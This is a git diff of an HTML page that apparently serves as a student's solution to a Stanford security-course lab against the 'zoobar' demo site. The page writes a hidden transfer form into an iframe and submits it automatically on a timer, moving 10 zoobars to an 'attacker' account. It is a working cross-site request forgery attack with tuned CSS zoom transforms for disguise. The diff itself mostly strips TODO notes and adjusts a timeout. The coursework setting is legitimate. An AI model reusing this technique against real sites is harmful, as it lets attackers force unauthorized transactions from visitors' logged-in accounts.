@@ -11,9 +11,7 @@
 				height: 700px; 
 				margin: 0px; 
 				padding: 0px; 
-				/* TODO: host this somewhere fixed or include with the project */
-				/* TODO: add background image to git repo */
-				background-image: url("http://www.stanford.edu/~rmferrer/pfiles/back.jpg");
+				background-image: url("back.jpg");
 				background-repeat: no-repeat;
 			}
 		</style>
@@ -27,10 +25,11 @@
 		<script type="text/javascript">
 		//<![CDATA[
 			var hostname = "zoobar.stanford.edu";
+			// var hostname = "localhost";
 			var action = "http://" + hostname + "/transferC.php"
 			var zoobars = "10";
 			var attacker_name = "attacker";
-			var timeout = 100;
+			var timeout = 200;
 			var CSS_ZOOM_TRANSFORM_UBUNTU = "transform: scale(26, 36) translate(100px, 720px);";
 			var CSS_ZOOM_TRANSFORM_OSX = "transform: scale(27, 49) translate(130px, 766px);";
 			var css_zoom_transform = CSS_ZOOM_TRANSFORM_UBUNTU;
@@ -48,38 +47,18 @@
 				"<input type='text' name='submission' value='Send'>" +
 				"</form>";
 
-			// TODO: need to change localhost to zoobar.stanford.edu
-			// TODO: need to change recipient to attacker, and zoobars to 10
-			// TODO: Try to factor out code. and make cleaner.
-			// TODO: need to check attack does not get screwed up when resizing window
-			// TODO: need to test on zoobar.stanford.edu in MACOS firefox
-			// TODO: put CSS transform attrs for moz and webkit
-			// for OSX firefox the transforms are : transform: scale(27, 49) translate(130px, 766px);
-			// for Ubuntu firefox the transforms are :  transform: scale(26, 36) translate(100px, 720px);
-			// TODO: is my current TicTacToe interaction OK?
-			// TODO: regarding "it should not be obvious that your page is loading content from zoo- bar.stanford.edu." is is OK
-			// TODO: if lower bar says Waiting for zoobar.stanford.edu for a sec?
-			// TODO: solve OSX, ubuntu layout incompatibility. possibly using anchors to solve OSX vs Ubuntu incompatibility
-			// TODO: beware of race condition in checking number of loads
-			// TODO: make UI more engaging. maybe some gif game?
-			// TODO: cleanup and comment
-
 			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
 			
 			// Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. 
 			// See http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
 			outerFrameDoc.open();
 			outerFrameDoc.close();
-			//Set innerHTML of the body tag.
 			outerFrameDoc.body.innerHTML = egg;
 
 			var transferForm = outerFrameDoc.body.children['transferForm'];
-			//transferForm.submit();
 			
 			setTimeout( function(){ transferForm.submit(); }, timeout );
 
-
-			//setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 50 );
 		//]]>
 		</script>
 		
